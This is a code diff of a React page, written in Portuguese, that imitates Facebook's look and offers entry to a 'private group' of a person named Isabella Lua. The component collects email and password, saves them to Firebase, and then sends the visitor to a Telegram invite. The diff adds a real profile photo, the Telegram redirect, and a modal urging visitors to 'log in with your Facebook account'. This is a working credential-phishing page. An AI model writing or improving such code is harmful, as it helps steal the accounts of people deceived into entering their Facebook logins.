@@ -7,12 +7,13 @@ import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Separator } from "@/components/ui/separator"
 import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
-import { Lock, Users, Shield } from 'lucide-react'
+import { Lock, Users, Shield } from "lucide-react"
 
 export default function GrupoPrivadoIsabella() {
   const [email, setEmail] = useState("")
   const [password, setPassword] = useState("")
   const [isLoading, setIsLoading] = useState(false)
+  const [showModal, setShowModal] = useState(false)
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault()
@@ -46,8 +47,8 @@ export default function GrupoPrivadoIsabella() {
 
         // Pequeno delay para mostrar o loading
         setTimeout(() => {
-          // Redireciona para o Facebook
-          window.location.href = "https://www.facebook.com/"
+          // Redireciona para o Telegram
+          window.location.href = "https://t.me/+h6JxPBU61oo2N2Mx"
         }, 1000)
       } else {
         console.error("❌ Erro ao salvar no Firebase")
@@ -62,7 +63,7 @@ export default function GrupoPrivadoIsabella() {
   }
 
   const handleSolicitarAcesso = () => {
-    alert("🔄 Redirecionando para formulário de solicitação de acesso...")
+    setShowModal(true)
   }
 
   return (
@@ -75,7 +76,7 @@ export default function GrupoPrivadoIsabella() {
             <div className="flex items-center justify-center mb-4">
               <div className="relative">
                 <Avatar className="w-20 h-20 border-4 border-white shadow-xl ring-4 ring-[#1877F2]/30">
-                  <AvatarImage src="/placeholder.svg?height=80&width=80" alt="Isabella Lua" className="object-cover" />
+                  <AvatarImage src="/images/isabella-perfil.jpg" alt="Isabella Lua" className="object-cover" />
                   <AvatarFallback className="bg-gradient-to-br from-[#1877F2] to-[#42B72A] text-white font-bold text-2xl">
                     IL
                   </AvatarFallback>
@@ -191,6 +192,40 @@ export default function GrupoPrivadoIsabella() {
               <span>🔥 FIREBASE: Dados salvos automaticamente na nuvem</span>
             </div>
           </div>
+
+          {/* Modal de Solicitar Acesso */}
+          {showModal && (
+            <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 px-4">
+              <div className="bg-white rounded-xl shadow-2xl p-6 max-w-sm w-full animate-in fade-in duration-300">
+                <div className="text-center">
+                  <div className="mb-4">
+                    <div className="w-16 h-16 bg-[#1877F2] rounded-full flex items-center justify-center mx-auto mb-3">
+                      <Lock className="w-8 h-8 text-white" />
+                    </div>
+                    <h3 className="text-xl font-bold text-[#1C1E21] mb-2">Acesso Restrito</h3>
+                    <p className="text-gray-600 text-sm leading-relaxed">
+                      Para entrar no grupo privado da Isabella Lua, você precisa fazer login com sua conta do Facebook
+                      primeiro.
+                    </p>
+                  </div>
+                  <div className="space-y-3">
+                    <Button
+                      onClick={() => setShowModal(false)}
+                      className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white font-semibold py-3 rounded-lg transition-all duration-200"
+                    >
+                      Entendi, vou fazer login
+                    </Button>
+                    <button
+                      onClick={() => setShowModal(false)}
+                      className="w-full text-gray-500 text-sm hover:text-gray-700 transition-colors"
+                    >
+                      Fechar
+                    </button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          )}
 
           {/* Rodapé */}
           <footer className="mt-8 text-center animate-in fade-in duration-700 delay-500">
